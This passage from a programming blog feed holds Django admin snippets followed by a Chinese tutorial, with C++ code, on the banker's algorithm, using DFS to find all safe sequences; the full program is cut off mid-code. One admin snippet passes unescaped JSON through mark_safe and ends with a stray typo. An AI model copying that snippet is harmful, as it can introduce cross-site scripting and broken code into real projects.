<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> viewsets</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestViewSet</span>(viewsets.ModelViewSet):</span><br><span class="line">    ...</span><br><span class="line">    pagination_unlimited = <span class="literal">True</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestViewSet</span>(viewsets.ModelViewSet):</span><br><span class="line">    ...</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pagination_unlimited</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.action == <span class="string">&quot;XXXX&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

</details>

<h1 id="Django-Admin"><a href="#Django-Admin" class="headerlink" title="Django Admin"></a><a name="django-admin">Django Admin</a></h1><h2 id="Display-JSONField"><a href="#Display-JSONField" class="headerlink" title="Display JSONField"></a><a name="display-JSONField">Display JSONField</a></h2><p>在Django Admin中更友好的展示<code>JSONField</code>字段的值.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.utils.safestring <span class="keyword">import</span> mark_safe</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestAdmin</span>(admin.ModelAdmin):</span><br><span class="line">    ...</span><br><span class="line">    readonly_fields = (<span class="string">&quot;pretty_config&quot;</span>,)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pretty_config</span>(<span class="params">self, obj</span>):</span><br><span class="line">        result = json.dumps(</span><br><span class="line">            obj.config, indent=<span class="number">2</span>, sort_keys=<span class="literal">True</span>, ensure_ascii=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> mark_safe(<span class="string">f&quot;&lt;pre&gt;<span class="subst">&#123;result&#125;</span>&lt;/pre&gt;&quot;</span>)x </span><br></pre></td></tr></table></figure>

<h2 id="Override-UserAdmin"><a href="#Override-UserAdmin" class="headerlink" title="Override UserAdmin"></a><a name="override-user-admin">Override UserAdmin</a></h2><p>基于<a href="https://github.com/django/django/blob/517d3bb4dd17e9c51690c98d747b86a0ed8b2fbf/django/contrib/auth/admin.py#L44">django@517d3bb</a>的<code>UserAdmin</code>源码,移除无关字段的<code>UserAdmin</code>如下.</p>
<details>
<summary>admin/user.py</summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserAdmin</span>(<span class="title class_ inherited__">DjangoUserAdmin</span>):</span><br><span class="line">    fieldsets = (</span><br><span class="line">        (<span class="literal">None</span>, &#123;<span class="string">&quot;fields&quot;</span>: (<span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>)&#125;),</span><br><span class="line">        (</span><br><span class="line">            _(<span class="string">&quot;Personal info&quot;</span>),</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;fields&quot;</span>: (</span><br><span class="line">                    <span class="comment"># &quot;first_name&quot;,</span></span><br><span class="line">                    <span class="comment"># &quot;last_name&quot;,</span></span><br><span class="line">                    <span class="string">&quot;email&quot;</span>,</span><br><span class="line">                )</span><br><span class="line">            &#125;,</span><br><span class="line">        ),</span><br><span class="line">        (</span><br><span class="line">            _(<span class="string">&quot;Permissions&quot;</span>),</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;fields&quot;</span>: (</span><br><span class="line">                    <span class="string">&quot;is_active&quot;</span>,</span><br><span class="line">                    <span class="comment"># &quot;is_staff&quot;,</span></span><br><span class="line">                    <span class="string">&quot;is_superuser&quot;</span>,</span><br><span class="line">                    <span class="comment"># &quot;groups&quot;,</span></span><br><span class="line">                    <span class="comment"># &quot;user_permissions&quot;,</span></span><br><span class="line">                ),</span><br><span class="line">            &#125;,</span><br><span class="line">        ),</span><br><span class="line">        (_(<span class="string">&quot;Important dates&quot;</span>), &#123;<span class="string">&quot;fields&quot;</span>: (<span class="string">&quot;last_login&quot;</span>, <span class="string">&quot;date_joined&quot;</span>)&#125;),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    list_display = (</span><br><span class="line">        <span class="string">&quot;username&quot;</span>,</span><br><span class="line">        <span class="string">&quot;email&quot;</span>,</span><br><span class="line">        <span class="comment"># &quot;first_name&quot;,</span></span><br><span class="line">        <span class="comment"># &quot;last_name&quot;,</span></span><br><span class="line">        <span class="comment"># &quot;is_staff&quot;,</span></span><br><span class="line">    )</span><br><span class="line">    search_fields = (</span><br><span class="line">        <span class="string">&quot;username&quot;</span>,</span><br><span class="line">        <span class="comment"># &quot;first_name&quot;,</span></span><br><span class="line">        <span class="comment"># &quot;last_name&quot;,</span></span><br><span class="line">        <span class="string">&quot;email&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    filter_horizontal = (</span><br><span class="line">        <span class="comment"># &quot;groups&quot;,</span></span><br><span class="line">        <span class="comment"># &quot;user_permissions&quot;,</span></span><br><span class="line">    )</span><br><span class="line">    list_filter = (</span><br><span class="line">        <span class="comment"># &quot;is_staff&quot;,</span></span><br><span class="line">        <span class="string">&quot;is_superuser&quot;</span>,</span><br><span class="line">        <span class="string">&quot;is_active&quot;</span>,</span><br><span class="line">        <span class="comment"># &quot;groups&quot;,</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

</details>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Django</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>银行家算法(使用DFS找出所有安全序列)</title>
    <url>/posts/647653334/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="银行家算法"><a href="#银行家算法" class="headerlink" title="银行家算法"></a>银行家算法</h3><p>银行家算法是一种最有代表性的避免死锁的算法。在避免死锁方法中允许进程动态地申请资源，但系统在进行资源分配之前，应先计算此次分配资源的安全性，若分配不会导致系统进入不安全状态，则分配，否则等待。为实现银行家算法，系统必须设置若干数据结构。</p>
<span id="more"></span>

<h3 id="安全状态"><a href="#安全状态" class="headerlink" title="安全状态"></a>安全状态</h3><ul>
<li>系统能按某种进程推进顺序{P<sub>1</sub>，…，P<sub>n</sub>}为每个进程P<sub>i</sub>分配其所需资源，直至满足每个进程对资源的最大需求，使每个进程都可顺利地完成。</li>
<li>此时称{P<sub>1</sub>，…，P<sub>n</sub>}为安全序列。如果系统无法找到这样一个安全序列，则称系统处于不安全状态。</li>
<li>并非所有不安全状态都必然会转为死锁状态，但当系统进入不安全状态后，就有可能进入死锁状态。反之，只要系统处于安全状态，系统便不会进入死锁状态。</li>
<li>因此，避免死锁的实质在于，系统在进行资源分配时，应用系统不进入不安全状态。</li>
</ul>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><ol>
<li>可利用资源向量Available<br>是个含有m个元素的数组，其中的每一个元素代表一类可利用的资源数目。如果Available[j]&#x3D;K，则表示系统中现有Rj类资源K个。</li>
<li>最大需求矩阵Max<br>这是一个n×m的矩阵，它定义了系统中n个进程中的每一个进程对m类资源的最大需求。如果Max[i,j]&#x3D;K，则表示进程i需要R<sub>j</sub>类资源的最大数目为K。</li>
<li>分配矩阵Allocation<br>这也是一个n×m的矩阵，它定义了系统中每一类资源当前已分配给每一进程的资源数。如果Allocation[i,j]&#x3D;K，则表示进程i当前已分得R<sub>j</sub>类资源的数目为K。</li>
<li>需求矩阵Need。<br>这也是一个n×m的矩阵，用以表示每一个进程尚需的各类资源数。如果Need[i,j]&#x3D;K，则表示进程i还需要R<sub>j</sub>类资源K个，方能完成其任务。<br>Need[i,j]&#x3D;Max[i,j]-Allocation[i,j]</li>
</ol>
<h2 id="银行家算法-1"><a href="#银行家算法-1" class="headerlink" title="银行家算法"></a>银行家算法</h2><p>设Request<sub>i</sub>是进程P<sub>i</sub>的请求向量，如果Request<sub>i</sub>[j]&#x3D;K,表示进程P<sub>i</sub>需要K个R<sub>j</sub>类型。当P<sub>i</sub>发出资源请求后，系统按下输步骤进行检查:</p>
<ol>
<li>如果Request<sub>i</sub>[j] &lt;&#x3D; Need[i][j],便转向步骤2；否则认为出错，因为它所需要的资源数已超过它所宣布的最大值</li>
<li>如果Request<sub>i</sub>[j] &lt;&#x3D; Available[i][j]，便转向步骤3；否则表示尚无足够资源，P<sub>i</sub>需等待  </li>
<li>系统试探着把资源分配给进程P<sub>i</sub>,并修改下面数据结构中的数值:<ul>
<li>Available[j] -&#x3D; Request<sub>i</sub>[j]</li>
<li>Allocation[i][j] +&#x3D; Request<sub>i</sub>[j]</li>
<li>Need[i][j] -&#x3D; Request<sub>i</sub>[j]</li>
</ul>
</li>
<li>系统执行安全性算法，检查此次资源分配后系统是否处于安全状态.若安全，正式将资源分配给进程P<sub>i</sub>，以完成本次分配；否则，讲将本次的试探分配作废,恢复原来的资源分配状态，让进程P<sub>i</sub>等待</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check_bank</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span> <span class="comment">//按照银行家算法检查资源请求</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Request[j] &gt; Need[i][j] || Request[j] &gt; Available[j])</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">update</span>(i, Request);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="尝试分配资源-恢复原来的资源分配状态"><a href="#尝试分配资源-恢复原来的资源分配状态" class="headerlink" title="尝试分配资源&#x2F;恢复原来的资源分配状态"></a>尝试分配资源&#x2F;恢复原来的资源分配状态</h2><h3 id="尝试分配资源"><a href="#尝试分配资源" class="headerlink" title="尝试分配资源"></a>尝试分配资源</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span> <span class="comment">//更新数据</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        Available[j] -= Request[j];</span><br><span class="line">        Allocation[i][j] += Request[j];</span><br><span class="line">        Need[i][j] -= Request[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="恢复原来的资源分配状态"><a href="#恢复原来的资源分配状态" class="headerlink" title="恢复原来的资源分配状态"></a>恢复原来的资源分配状态</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">recovery</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span><span class="comment">//还原数据</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        Available[j] += Request[j];</span><br><span class="line">        Allocation[i][j] -= Request[j];</span><br><span class="line">        Need[i][j] += Request[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="安全性算法"><a href="#安全性算法" class="headerlink" title="安全性算法"></a>安全性算法</h2><ol>
<li>设置两个工作向量:<br>① 工作向量WORK，它表示系统可提供给进程继续运行所需的各类资源数目，它含有m个元素，在执行安全算法开始时，WORK:&#x3D;Available<br>② Finish:它表示系统是否有足够的资源分配给进程，使之运行完成。初始Finish[i]: &#x3D; false；当有足够资源分配给进程时，再令Finish[i]：&#x3D;true。 </li>
<li>从进程集合中找出一个满足下列条件的进程：<br>① Finish[i] &#x3D; false<br>② Need[i][j] &lt;&#x3D; work[j]<br>若找到，执行3,否则，执行步骤4</li>
<li>当进程p<sub>i</sub>获得资源后，可顺利执行，直至完成，并释放出分配给它的资源，故应执行:</li>
</ol>
<ul>
<li>Finish[i] &#x3D; true </li>
<li>WORK[j] +&#x3D; Allocation[i][j]</li>
<li>go to step 2</li>
</ul>
<ol start="4">
<li>如果所有进程的Finish[i] &#x3D; true，则表示系统处于安全性状态，否则，系统处于不安全状态。</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">check_safe</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span> <span class="comment">//检查系统安全性</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> Work[MaxNumber];</span><br><span class="line">    <span class="type">bool</span> Finished[MaxNumber];</span><br><span class="line">    <span class="built_in">memset</span>(Finished, <span class="literal">false</span>, <span class="built_in">sizeof</span>(Finished));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        Work[i] = Available[i];</span><br><span class="line">    sta = UnSafe;</span><br><span class="line">    <span class="built_in">Dfs</span>(<span class="number">0</span>, Work, Finished);</span><br><span class="line">    <span class="keyword">if</span>(sta==UnSafe)</span><br><span class="line">        <span class="built_in">recovery</span>(i, Request);<span class="comment">//还原数据</span></span><br><span class="line">    <span class="keyword">return</span> sta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>复杂度分析:安全性检查算法，有两种for循环，最内层for循环每次继续向下一层搜索，故时间复杂度为O((n * m)^ n)</p>
<h2 id="利用Dfs找出所有安全序列"><a href="#利用Dfs找出所有安全序列" class="headerlink" title="利用Dfs找出所有安全序列"></a>利用Dfs找出所有安全序列</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dfs</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Work[], <span class="type">bool</span> Finished[])</span><span class="comment">//深度优先搜索,找到所有的安全序列</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i == n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(Finished[j] == <span class="literal">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sta = Safe;</span><br><span class="line">        SafeOrder.<span class="built_in">push_back</span>(temp);</span><br><span class="line">        <span class="comment">//temp.clear();</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Finished[j] == <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">bool</span> t = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; m; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(Need[j][k] &gt; Work[k])</span><br><span class="line">                &#123;</span><br><span class="line">                    t = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(t == <span class="literal">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; m; k++)</span><br><span class="line">                    Work[k] += Allocation[j][k];</span><br><span class="line">                Finished[j] = <span class="literal">true</span>;</span><br><span class="line">                temp.<span class="built_in">push_back</span>(j);</span><br><span class="line">                <span class="built_in">Dfs</span>(i + <span class="number">1</span>, Work, Finished);</span><br><span class="line">                temp.<span class="built_in">pop_back</span>();       <span class="comment">//回溯,将第i个进程所做的改变恢复</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; m; k++)</span><br><span class="line">                &#123;</span><br><span class="line">                    Work[k] -= Allocation[j][k];</span><br><span class="line">                &#125;</span><br><span class="line">                Finished[j] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="测试数据"><a href="#测试数据" class="headerlink" title="测试数据"></a>测试数据</h2><div class="note default no-icon"><p>3
A 3
B 3
C 2
5
7 5 3
3 2 2
9 0 2
2 2 2
4 3 3
0 1 0
2 0 0
3 0 2
2 1 1
0 0 2
2
1
1
0
2
</p></div>

<h2 id="实验截图"><a href="#实验截图" class="headerlink" title="实验截图"></a>实验截图</h2><p>![合理且安全的资源请求](&#x2F;images&#x2F;Banker&#39;s Algorithm1.jpg)</p>
<center>合理且安全的资源请求</center>
![不合理的资源请求](/images/Banker's Algorithm2.jpg)
<center>不合理的资源请求</center>
![会导致系统处于不安全状态的资源请求](/images/Banker's Algorithm3.jpg)
<center>会导致系统处于不安全状态的资源请求</center>

<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Problem:银行家算法</span></span><br><span class="line"><span class="comment">Author:QiZhao</span></span><br><span class="line"><span class="comment">Data:2018-05-31</span></span><br><span class="line"><span class="comment">Description:预防进程死锁的银行家算法</span></span><br><span class="line"><span class="comment">Copyright  2018 QiZhao. All rights reserved.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span><span class="comment">//提供vector</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span><span class="comment">//提供memset函数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span><span class="comment">//提供fflush函数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span><span class="comment">//提供exit函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">status</span> &#123;Safe, UnSafe&#125;;<span class="comment">//安全性检查的结果</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxNumber = <span class="number">100</span>;<span class="comment">//进程数量的最大值</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Available[MaxNumber];<span class="comment">//每种资源的可用数量</span></span><br><span class="line"><span class="type">int</span> Max[MaxNumber][MaxNumber];<span class="comment">//n*m的矩阵,表示每个进程所需的最大资源量</span></span><br><span class="line">string name[MaxNumber];<span class="comment">//n个进程的进程名</span></span><br><span class="line"><span class="type">int</span> Allocation[MaxNumber][MaxNumber];<span class="comment">//n*m的矩阵,表示每个进程每种资源已经分配的量</span></span><br><span class="line"><span class="type">int</span> Need[MaxNumber][MaxNumber];<span class="comment">//n*m的矩阵,表示每个进程还需的每种资源量</span></span><br><span class="line"><span class="type">int</span> Request[MaxNumber];<span class="comment">//所请求的每种资源的资源量</span></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; SafeOrder;<span class="comment">//存储所有的安全序列</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; temp;<span class="comment">//存储一个临时安全序列</span></span><br><span class="line"><span class="type">int</span> n, m;<span class="comment">//进程数，资源种类数</span></span><br><span class="line"></span><br><span class="line">status sta = UnSafe;<span class="comment">//安全性检查的结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">recovery</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check_bank</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">check_safe</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">request</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">choose</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dfs</span><span class="params">(<span class="type">int</span> i,<span class="type">int</span> Wordk[],<span class="type">bool</span> Finished[])</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数实现</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">input</span><span class="params">()</span><span class="comment">//读入数据</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入系统资源的种类数:&quot;</span>;</span><br><span class="line">    cin &gt;&gt; m;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请依次输入&quot;</span> &lt;&lt; m &lt;&lt; <span class="string">&quot;种系统资源的名称与数量:&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        cin &gt;&gt; name[i] &gt;&gt; Available[i];</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入进程的数量:&quot;</span>;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入各个进程的最大需求量&lt;&quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; m &lt;&lt; <span class="string">&quot;矩阵&gt;[MAX]&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">            cin &gt;&gt; Max[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入各进程已申请的资量&lt;&quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; m &lt;&lt; <span class="string">&quot;矩阵&gt;[Allocation]&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">            cin &gt;&gt; Allocation[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span><span class="comment">//计算Need</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            Need[i][j] = Max[i][j] - Allocation[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span><span class="comment">//显示资源使用情况</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; Max\tAllocation\tNeed\tAvaliable&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">3</span>)</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; name[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">1</span>)</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;  &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; Max[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; Allocation[i][j] &lt;&lt; <span class="string">&quot;   &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; Need[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;\t &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; Available[j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span> <span class="comment">//更新数据</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        Available[j] -= Request[j];</span><br><span class="line">        Allocation[i][j] += Request[j];</span><br><span class="line">        Need[i][j] -= Request[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">recovery</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span><span class="comment">//还原数据</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        Available[j] += Request[j];</span><br><span class="line">        Allocation[i][j] -= Request[j];</span><br><span class="line">        Need[i][j] += Request[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check_bank</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span> <span class="comment">//按照银行家算法检查资源请求</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Request[j] &gt; Need[i][j] || Request[j] &gt; Available[j])</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">update</span>(i, Request);</span><br><span class="line">    <span class="keyword">return</span> <span 